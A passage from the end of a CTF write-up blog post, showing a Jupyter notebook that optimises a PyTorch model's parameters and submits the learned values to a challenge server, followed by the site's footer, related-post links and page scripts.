</span></span><span class="line"><span class="cl">    <span class="s2">&#34;for ep in tqdm.trange(150):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    if ep == 10:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        optimizer = torch.optim.Adam(ctf2.parameters(),lr=1)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    if ep == 40:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        optimizer = torch.optim.Adam(ctf2.parameters(),lr=0.1)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    if ep == 80:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        los=[]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        optimizer = torch.optim.Adam(ctf2.parameters(),lr=0.01)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    if ep == 130:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        optimizer = torch.optim.Adam(ctf2.parameters(),lr=0.001)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    for i in range(100):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        optimizer.zero_grad()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        y = ctf2()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        lx = loss_fn(y)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        lx.backward()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;        optimizer.step()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;    los.append(lx.item())</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;import matplotlib.pyplot as plt</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;plt.figure(figsize=(10,3))</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;plt.plot(los)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;print(los[-1])&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;cell_type&#34;</span><span class="p">:</span> <span class="s2">&#34;code&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;execution_count&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;metadata&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;collapsed&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pycharm&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;#</span><span class="si">%%</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="p">},</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;source&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;px = ctf2.L.bias.tolist()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;txt =requests.post(url,data={&#39;data[]&#39;:px}).text.replace(&#39;</span><span class="se">\\</span><span class="s2">n&#39;,&#39;&lt;br&gt;&#39;)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;# print(txt)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;txt = re.findall(r&#39;#6a91c6;</span><span class="se">\&#34;</span><span class="s2">&gt;(.*)&lt;/blockquote&gt;&#39;,txt)[0].replace(&#39;&lt;br&gt;&#39;,&#39;</span><span class="se">\\</span><span class="s2">n&#39;).replace(&#39;</span><span class="se">\\</span><span class="s2">n</span><span class="se">\\</span><span class="s2">n&#39;,&#39;</span><span class="se">\\</span><span class="s2">n&#39;)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;print(txt)&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">],</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;metadata&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;kernelspec&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;display_name&#34;</span><span class="p">:</span> <span class="s2">&#34;Python 3.10.4 64-bit&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;language&#34;</span><span class="p">:</span> <span class="s2">&#34;python&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;python3&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;language_info&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;codemirror_mode&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;ipython&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;version&#34;</span><span class="p">:</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">   <span class="p">},</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;file_extension&#34;</span><span class="p">:</span> <span class="s2">&#34;.py&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;mimetype&#34;</span><span class="p">:</span> <span class="s2">&#34;text/x-python&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;python&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;nbconvert_exporter&#34;</span><span class="p">:</span> <span class="s2">&#34;python&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;pygments_lexer&#34;</span><span class="p">:</span> <span class="s2">&#34;ipython3&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;3.10.7&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;vscode&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="s2">&#34;interpreter&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;hash&#34;</span><span class="p">:</span> <span class="s2">&#34;3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">},</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;nbformat&#34;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;nbformat_minor&#34;</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ctf/">ctf</a>
        
            <a href="/tags/web/">web</a>
        
            <a href="/tags/ctfshow/">ctfshow</a>
        
            <a href="/tags/%E6%96%B0%E6%89%8B%E6%9D%AF/">æ–°æ‰‹æ¯</a>
        
            <a href="/tags/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">sessionååºåˆ—åŒ–</a>
        
            <a href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">å˜é‡è¦†ç›–</a>
        
            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/">æ•°æ®åˆ†æ</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>
    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/ctfshow-%E5%B9%B4ctf-web/">
        
        

        <div class="article-details">
            <h2 class="article-title">ctfshow-å¹´CTF-web</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF-web/">
        
        

        <div class="article-details">
            <h2 class="article-title">ctfshow-æ„šäººæ¯-web</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
        
        

        <div class="article-details">
            <h2 class="article-title">ä¿¡æ¯æ”¶é›†</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/parse_url/">
        
        

        <div class="article-details">
            <h2 class="article-title">PARSE_URL</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="Relish1one/blog_data"
        issue-term="pathname"
        
        label="none"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2022 - 
        
        2023 R1one&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<script
    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js"
    integrity="sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe"
    crossorigin="anonymous"
    size="300"
    alpha="0.6"
    zindex="-1"
    defer
></script>

<script
    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/nprogress.min.js"
    integrity="sha384-bHDlAEUFxsRI7JfULv3DTpL2IXbbgn4JHQJibgo5iiXSK6Iu8muwqHANhun74Cqg"
    crossorigin="anonymous"
></script>
<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/css/nprogress.css"
    integrity="sha384-KJyhr2syt5+4M9Pz5dipCvTrtvOmLk/olWVdfhAp858UCa64Ia5GFpTN7+G4BWpE"
    crossorigin="anonymous"
/>
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>

    </body>
</html>
